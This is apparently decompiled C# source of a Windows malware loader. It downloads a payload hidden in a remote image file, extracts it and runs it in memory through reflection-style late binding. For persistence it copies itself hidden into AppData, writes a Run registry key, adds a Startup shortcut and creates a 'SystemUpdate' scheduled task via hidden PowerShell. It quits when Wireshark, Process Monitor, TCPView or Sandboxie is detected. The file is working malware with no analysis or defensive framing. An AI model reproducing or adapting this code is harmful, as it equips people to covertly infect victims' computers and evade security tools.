using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

[StandardModule]
internal sealed class Class6
{
	public struct Struct0
	{
		public static byte[] byte_0 = byte_1;
	}

	public struct Struct1
	{
		public static object object_0 = Struct0.byte_0;
	}

	public static object object_0;

	public static object object_1;

	public static string string_0 = "";

	public static object object_2 = ".exe";

	public static bool bool_0 = Conversions.ToBoolean("true");

	public static bool bool_1 = Conversions.ToBoolean("false");

	public static bool bool_2 = Conversions.ToBoolean("false");

	public static bool bool_3 = Conversions.ToBoolean("true");

	public static object object_3 = "spavaj";

	public static object object_4 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

	public static bool bool_4 = Conversions.ToBoolean("false");

	public static object object_5 = "";

	public static object object_6 = "719E2AF20B854CB1DA04037C3143AB28";

	private static object[] object_7 = null;

	private static object[] object_8 = null;

	public static object object_9 = "14584";

	public static object object_10 = "603648";

	public static object object_11 = "https://f.lewd.se/DDnzml_upload.png";

	public static WebClient webClient_0 = new WebClient();

	public static byte[] byte_0;

	public static byte[] byte_1;

	public static object object_12;

	public static object object_13;

	public static object object_14;

	public static object object_15;

	public static object object_16;

	static Class6()
	{
		WebClient webClient = webClient_0;
		object[] array = new object[1] { RuntimeHelpers.GetObjectValue(object_11) };
		bool[] array2 = new bool[1] { true };
		object obj = NewLateBinding.LateGet((object)webClient, (Type)null, "DownloadData", array, (string[])null, (Type[])null, array2);
		if (array2[0])
		{
			object_11 = RuntimeHelpers.GetObjectValue(array[0]);
		}
		byte_0 = (byte[])obj;
		byte_1 = new byte[checked(Conversions.ToInteger(Operators.SubtractObject(Operators.SubtractObject((object)byte_0.Length, object_9), (object)1)) + 1)];
		object_12 = Class10.MySettings_0.Setting1;
		object_13 = Class10.MySettings_0.Setting2;
		object_14 = Class10.MySettings_0.Setting;
		object_15 = AppDomain.CurrentDomain;
		object_16 = "sender As Object, e As DragEventArgs) Handles";
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void smethod_0()
	{
		string text = Conversions.ToString(Operators.ConcatenateObject((object)((ApplicationBase)Class2.Class0_0).get_Info().get_ProductName(), object_2));
		string executablePath = Application.get_ExecutablePath();
		string text2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + string_0 + "\\" + text;
		if (File.Exists(executablePath))
		{
			File.Copy(executablePath, text2);
			File.SetAttributes(text2, FileAttributes.Hidden | FileAttributes.System);
		}
	}

	public static void smethod_1()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 74:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 4:
						case 5:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0009:
					num = 2;
					if (!Operators.ConditionalCompareObjectEqual(object_4, (object)"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", false))
					{
						goto end_IL_0001_3;
					}
					break;
					end_IL_0001_2:
					break;
				}
				num = 3;
				smethod_4();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 74;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_2()
	{
		int try0001_dispatch = -1;
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		Class7.Class8 @class = default(Class7.Class8);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					num = 1;
					if (bool_2)
					{
						goto IL_000a;
					}
					goto IL_0034;
				case 148:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0012;
						case 4:
							goto IL_0019;
						case 5:
							goto IL_0025;
						case 6:
							goto IL_002d;
						case 7:
						case 8:
							goto IL_0034;
						case 9:
							goto IL_003d;
						case 10:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 11:
						case 12:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_003d:
					num = 9;
					@class = new Class7.Class8();
					break;
					IL_0034:
					num = 8;
					if (!bool_4)
					{
						goto end_IL_0001_3;
					}
					goto IL_003d;
					IL_000a:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0012;
					IL_0012:
					num = 3;
					smethod_6();
					goto IL_0019;
					IL_0019:
					num = 4;
					Thread.Sleep(5000);
					goto IL_0025;
					IL_0025:
					num = 5;
					smethod_7();
					goto IL_002d;
					IL_002d:
					num = 6;
					smethod_5();
					goto IL_0034;
					end_IL_0001_2:
					break;
				}
				num = 10;
				@class.method_0();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 148;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void smethod_3()
	{
		int try0001_dispatch = -1;
		int num = default(int);
		string text = default(string);
		int num2 = default(int);
		int num3 = default(int);
		RegistryKey registryKey = default(RegistryKey);
		string value = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					num = 1;
					text = Conversions.ToString(Operators.ConcatenateObject((object)((ApplicationBase)Class2.Class0_0).get_Info().get_ProductName(), object_2));
					goto IL_0022;
				case 185:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0022;
						case 3:
							goto IL_003c;
						case 4:
							goto IL_0045;
						case 5:
							goto IL_004d;
						case 6:
							goto IL_0054;
						case 7:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 8:
						case 9:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0054:
					num = 6;
					registryKey = Registry.CurrentUser.OpenSubKey(Conversions.ToString(object_4), writable: true);
					break;
					IL_004d:
					num = 5;
					smethod_1();
					goto IL_0054;
					IL_0022:
					num = 2;
					value = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + string_0 + "\\" + text;
					goto IL_003c;
					IL_003c:
					num = 3;
					if (!bool_0)
					{
						goto end_IL_0001_3;
					}
					goto IL_0045;
					IL_0045:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_004d;
					end_IL_0001_2:
					break;
				}
				num = 7;
				registryKey.SetValue(Conversions.ToString(object_5), value);
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 185;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void smethod_4()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		object objectValue = default(object);
		object objectValue2 = default(object);
		string text = default(string);
		string text2 = default(string);
		object objectValue3 = default(object);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				object obj;
				object[] array;
				object[] array2;
				object obj2;
				object[] array3;
				object[] array4;
				bool[] array5;
				object obj3;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 666:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0011;
						case 4:
							goto IL_0032;
						case 5:
							goto IL_004c;
						case 6:
							goto IL_0064;
						case 7:
							goto IL_007c;
						case 8:
							goto IL_00a8;
						case 9:
							goto IL_0115;
						case 10:
							goto IL_018f;
						case 11:
							goto IL_01d7;
						case 12:
							goto IL_01fd;
						case 13:
							goto IL_0222;
						case 14:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 15:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_01d7:
					num = 11;
					NewLateBinding.LateSet(objectValue, (Type)null, "WindowStyle", new object[1] { 4 }, (string[])null, (Type[])null);
					goto IL_01fd;
					IL_018f:
					num = 10;
					NewLateBinding.LateSet(objectValue, (Type)null, "WorkingDirectory", new object[1] { RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue2, (Type)null, "ExpandEnvironmentStrings", new object[1] { "C:\\" }, (string[])null, (Type[])null, (bool[])null)) }, (string[])null, (Type[])null);
					goto IL_01d7;
					IL_0009:
					num = 2;
					Application.get_ExecutablePath();
					goto IL_0011;
					IL_0011:
					num = 3;
					text = Conversions.ToString(Operators.ConcatenateObject((object)((ApplicationBase)Class2.Class0_0).get_Info().get_ProductName(), object_2));
					goto IL_0032;
					IL_0032:
					num = 4;
					text2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + string_0 + "\\" + text;
					goto IL_004c;
					IL_004c:
					num = 5;
					objectValue2 = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", ""));
					goto IL_0064;
					IL_0064:
					num = 6;
					objectValue2 = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", ""));
					goto IL_007c;
					IL_007c:
					num = 7;
					objectValue3 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue2, (Type)null, "SpecialFolders", new object[1] { "Startup" }, (string[])null, (Type[])null, (bool[])null));
					goto IL_00a8;
					IL_00a8:
					num = 8;
					objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue2, (Type)null, "CreateShortcut", new object[1] { Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(objectValue3, (object)"\\"), object_5), (object)'.'), (object)'l'), (object)'n'), (object)'k') }, (string[])null, (Type[])null, (bool[])null));
					goto IL_0115;
					IL_0115:
					num = 9;
					obj = objectValue;
					array = new object[1];
					array2 = array;
					obj2 = objectValue2;
					array3 = new object[1] { text2 };
					array4 = array3;
					array5 = new bool[1] { true };
					obj3 = NewLateBinding.LateGet(obj2, (Type)null, "ExpandEnvironmentStrings", array4, (string[])null, (Type[])null, array5);
					if (array5[0])
					{
						text2 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array3[0]), typeof(string));
					}
					array2[0] = RuntimeHelpers.GetObjectValue(obj3);
					NewLateBinding.LateSet(obj, (Type)null, "TargetPath", array, (string[])null, (Type[])null);
					goto IL_018f;
					IL_0222:
					num = 13;
					NewLateBinding.LateCall(objectValue, (Type)null, "Save", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					break;
					IL_01fd:
					num = 12;
					NewLateBinding.LateSet(objectValue, (Type)null, "IconLocation", new object[1] { "%SystemRoot%\\system32\\SHELL32.dll,69" }, (string[])null, (Type[])null);
					goto IL_0222;
					end_IL_0001_2:
					break;
				}
				num = 14;
				File.SetAttributes(text2, FileAttributes.Hidden | FileAttributes.System);
				break;
				end_IL_0001:;
			}
			catch (object obj4) when (obj4 is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj4);
				try0001_dispatch = 666;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_5()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		Process[] processes = default(Process[]);
		Process[] array = default(Process[]);
		Process process = default(Process);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 334:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0011;
						case 4:
							goto IL_0023;
						case 5:
							goto IL_00a4;
						case 6:
							goto IL_00ac;
						case 7:
							goto IL_00b2;
						case 8:
							goto IL_00c0;
						case 9:
							goto IL_00da;
						case 10:
							goto IL_00ed;
						case 11:
						case 12:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 13:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_00ac:
					num5 = checked(num5 + 1);
					goto IL_00b2;
					IL_00a4:
					num = 5;
					Environment.Exit(1);
					goto IL_00ac;
					IL_0009:
					num = 2;
					processes = Process.GetProcesses();
					goto IL_0011;
					IL_0011:
					num = 3;
					array = processes;
					num5 = 0;
					goto IL_00b4;
					IL_00b4:
					if (num5 < array.Length)
					{
						process = array[num5];
						goto IL_0023;
					}
					goto IL_00c0;
					IL_00c0:
					num = 8;
					if (Operators.CompareString(Interaction.Command(), "debug", false) == 0)
					{
						break;
					}
					goto IL_00da;
					IL_00da:
					num = 9;
					Process.Start(Application.get_ExecutablePath(), "debug");
					goto IL_00ed;
					IL_00ed:
					num = 10;
					Process.GetCurrentProcess().Kill();
					break;
					IL_00b2:
					num = 7;
					goto IL_00b4;
					IL_0023:
					num = 4;
					if (process.MainWindowTitle.Equals("apateDNS") | process.MainWindowTitle.Equals("cports") | process.MainWindowTitle.Equals("procexp") | process.MainWindowTitle.Equals("curports") | process.MainWindowTitle.Equals("smsniff") | process.MainWindowTitle.Equals("Tcpview") | process.MainWindowTitle.Equals("Procmon"))
					{
						goto IL_00a4;
					}
					goto IL_00ac;
					end_IL_0001_2:
					break;
				}
				num = 12;
				new GClass0();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 334;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_6()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		Process[] processes = default(Process[]);
		Process[] array = default(Process[]);
		Process process = default(Process);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 130:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0011;
						case 4:
							goto IL_0020;
						case 5:
							goto IL_0035;
						case 6:
							goto IL_003d;
						case 7:
							goto IL_0043;
						default:
							goto end_IL_0001;
						case 8:
							goto end_IL_0001_2;
						}
						goto default;
					}
					IL_003d:
					num5 = checked(num5 + 1);
					goto IL_0043;
					IL_0035:
					num = 5;
					Environment.Exit(1);
					goto IL_003d;
					IL_0009:
					num = 2;
					processes = Process.GetProcesses();
					goto IL_0011;
					IL_0011:
					num = 3;
					array = processes;
					num5 = 0;
					goto IL_0045;
					IL_0045:
					if (num5 < array.Length)
					{
						process = array[num5];
						goto IL_0020;
					}
					goto end_IL_0001_2;
					IL_0043:
					num = 7;
					goto IL_0045;
					IL_0020:
					num = 4;
					if (process.MainWindowTitle.Equals("\"The Wireshark Network Analyzer\""))
					{
						goto IL_0035;
					}
					goto IL_003d;
					end_IL_0001:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 130;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static bool smethod_7()
	{
		if ((Process.GetProcessesByName("SandboxieDcomLaunch").Length >= 1) | (Process.GetProcessesByName("SandboxieRpcSs").Length >= 1))
		{
			Environment.Exit(1);
			bool result = default(bool);
			return result;
		}
		return false;
	}

	public static void smethod_8()
	{
		if (bool_1)
		{
			smethod_9();
		}
	}

	public static void smethod_9()
	{
		Application.Exit();
	}

	public static void smethod_10()
	{
		string text = Path.GetTempPath() + "\\system.cmd";
		if (File.Exists(text))
		{
			File.Delete(text);
		}
		byte[] bytes = File.ReadAllBytes(Application.get_ExecutablePath());
		string tempPath = Path.GetTempPath();
		File.WriteAllBytes(tempPath + "\\system.cmd", bytes);
		File.SetAttributes(text, FileAttributes.Hidden | FileAttributes.System);
		Interaction.Shell("powershell -windowstyle hidden (Start-Process -FilePath $env:Temp\\system.cmd)", (AppWinStyle)2, false, -1);
		Process.GetCurrentProcess().Kill();
		object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", ""));
		objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", ""));
		object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "SpecialFolders", new object[1] { "Startup" }, (string[])null, (Type[])null, (bool[])null));
		object objectValue3 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "CreateShortcut", new object[1] { Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(objectValue2, (object)"\\"), object_5), (object)'.'), (object)'l'), (object)'n'), (object)'k') }, (string[])null, (Type[])null, (bool[])null));
		object[] array = new object[1];
		object[] array2 = array;
		object obj = objectValue;
		object[] array3 = new object[1] { text };
		object[] array4 = array3;
		bool[] array5 = new bool[1] { true };
		object obj2 = NewLateBinding.LateGet(obj, (Type)null, "ExpandEnvironmentStrings", array4, (string[])null, (Type[])null, array5);
		if (array5[0])
		{
			text = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array3[0]), typeof(string));
		}
		array2[0] = RuntimeHelpers.GetObjectValue(obj2);
		NewLateBinding.LateSet(objectValue3, (Type)null, "TargetPath", array, (string[])null, (Type[])null);
		NewLateBinding.LateSet(objectValue3, (Type)null, "WorkingDirectory", new object[1] { RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "ExpandEnvironmentStrings", new object[1] { "C:\\" }, (string[])null, (Type[])null, (bool[])null)) }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(objectValue3, (Type)null, "WindowStyle", new object[1] { 4 }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(objectValue3, (Type)null, "IconLocation", new object[1] { "%SystemRoot%\\system32\\SHELL32.dll,69" }, (string[])null, (Type[])null);
		NewLateBinding.LateCall(objectValue3, (Type)null, "Save", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		File.SetAttributes(text, FileAttributes.Hidden | FileAttributes.System);
		Interaction.Shell("schtasks /create /sc minute /mo 1440 /tn SystemUpdate /tr " + text, (AppWinStyle)0, false, -1);
	}

	[STAThread]
	public static void Main()
	{
		int try0001_dispatch = -1;
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		int num5 = default(int);
		int num6 = default(int);
		byte[] array = default(byte[]);
		int num9 = default(int);
		int num10 = default(int);
		int minute = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				int num7;
				int num8;
				object[] array2;
				switch (try0001_dispatch)
				{
				default:
					num = 1;
					if (bool_2)
					{
						goto IL_000a;
					}
					goto IL_0012;
				case 841:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
						case 4:
							goto IL_0012;
						case 5:
							goto IL_001a;
						case 6:
							goto IL_0021;
						case 7:
							goto IL_003d;
						case 8:
							goto IL_0061;
						case 9:
							goto IL_006f;
						case 10:
							goto IL_0079;
						case 11:
							goto IL_0081;
						case 12:
							goto IL_0089;
						case 13:
						case 14:
							goto IL_0091;
						case 15:
							goto IL_009b;
						case 16:
							goto IL_00a3;
						case 17:
							goto IL_00ab;
						case 18:
						case 19:
							goto IL_00b3;
						case 20:
							goto IL_00bb;
						case 21:
							goto IL_00d0;
						case 22:
						case 23:
							goto IL_00d8;
						case 24:
							goto IL_00e7;
						case 25:
							goto IL_011e;
						case 26:
							goto IL_014b;
						case 27:
							goto IL_014e;
						case 28:
							goto IL_0151;
						case 29:
							goto IL_018f;
						case 30:
						case 31:
							goto IL_01b1;
						case 32:
							goto IL_01b4;
						case 34:
							goto IL_01cb;
						case 35:
							goto IL_01de;
						case 38:
							goto IL_01e9;
						case 33:
						case 39:
							goto IL_01ec;
						case 36:
						case 42:
							goto IL_01f8;
						case 43:
							goto end_IL_0001_2;
						case 37:
						case 40:
						case 41:
							num = 41;
							NewLateBinding.LateCall((object)null, typeof(Thread), "Sleep", new object[1] { Operators.MultiplyObject(object_3, (object)1000) }, (string[])null, (Type[])null, (bool[])null, true);
							goto IL_01f8;
						default:
							goto end_IL_0001;
						case 44:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0061:
					num = 8;
					num5 = checked(num5 + 1);
					goto IL_0067;
					IL_003d:
					num = 7;
					byte_1[num5] = byte_0[Conversions.ToInteger(Operators.AddObject(object_9, (object)num5))];
					goto IL_0061;
					IL_000a:
					num = 2;
					smethod_7();
					goto IL_0012;
					IL_0012:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_001a;
					IL_001a:
					num = 5;
					smethod_2();
					goto IL_0021;
					IL_0021:
					num = 6;
					num6 = Conversions.ToInteger(Operators.SubtractObject(object_10, (object)1));
					num5 = 0;
					goto IL_0067;
					IL_0067:
					num7 = num5;
					num8 = num6;
					if (num7 <= num8)
					{
						goto IL_003d;
					}
					goto IL_006f;
					IL_006f:
					num = 9;
					if (bool_1)
					{
						goto IL_0079;
					}
					goto IL_0091;
					IL_0079:
					num = 10;
					smethod_10();
					goto IL_0081;
					IL_0081:
					num = 11;
					smethod_4();
					goto IL_0089;
					IL_0089:
					num = 12;
					Application.Exit();
					goto IL_0091;
					IL_0091:
					num = 14;
					if (bool_3)
					{
						goto IL_009b;
					}
					goto IL_00b3;
					IL_009b:
					num = 15;
					smethod_0();
					goto IL_00a3;
					IL_00a3:
					num = 16;
					smethod_3();
					goto IL_00ab;
					IL_00ab:
					num = 17;
					smethod_4();
					goto IL_00b3;
					IL_00b3:
					num = 19;
					smethod_8();
					goto IL_00bb;
					IL_00bb:
					num = 20;
					if (Operators.ConditionalCompareObjectEqual(object_6, (object)"", false))
					{
						goto IL_00d0;
					}
					goto IL_00d8;
					IL_00d0:
					num = 21;
					Application.Exit();
					goto IL_00d8;
					IL_00d8:
					num = 23;
					array = (byte[])Struct1.object_0;
					goto IL_00e7;
					IL_00e7:
					num = 24;
					object_0 = RuntimeHelpers.GetObjectValue(Versioned.CallByName(RuntimeHelpers.GetObjectValue(object_15), Conversions.ToString(object_12), (CallType)1, new object[1] { array }));
					goto IL_011e;
					IL_011e:
					num = 25;
					object_1 = RuntimeHelpers.GetObjectValue(Versioned.CallByName(RuntimeHelpers.GetObjectValue(object_0), Conversions.ToString(object_13), (CallType)2, new object[0]));
					goto IL_014b;
					IL_014b:
					num = 26;
					goto IL_014e;
					IL_014e:
					num = 27;
					goto IL_0151;
					IL_0151:
					num = 28;
					if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(NewLateBinding.LateGet(object_1, (Type)null, "GetParameters", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null), (object)0, false))
					{
						goto IL_018f;
					}
					goto IL_01b1;
					IL_018f:
					num = 29;
					array2 = new object[1] { new string[1] { "1" } };
					goto IL_01b1;
					IL_01b1:
					num = 31;
					goto IL_01b4;
					IL_01b4:
					num = 32;
					num9 = checked(DateTime.Now.Minute + 1);
					goto IL_01ec;
					IL_01ec:
					num = 33;
					num10 = 1060;
					goto IL_01cb;
					IL_01cb:
					num = 34;
					minute = DateTime.Now.Minute;
					goto IL_01de;
					IL_01de:
					num = 35;
					if (num9 != minute)
					{
						goto IL_01e9;
					}
					goto IL_01f8;
					IL_01e9:
					num = 38;
					goto IL_01ec;
					IL_01f8:
					num = 42;
					num10 = 1050;
					break;
					end_IL_0001_2:
					break;
				}
				num = 43;
				RuntimeHelpers.GetObjectValue(Versioned.CallByName(RuntimeHelpers.GetObjectValue(object_1), Conversions.ToString(object_14), (CallType)1, new object[2] { 0, null }));
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj, num10);
				try0001_dispatch = 841;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
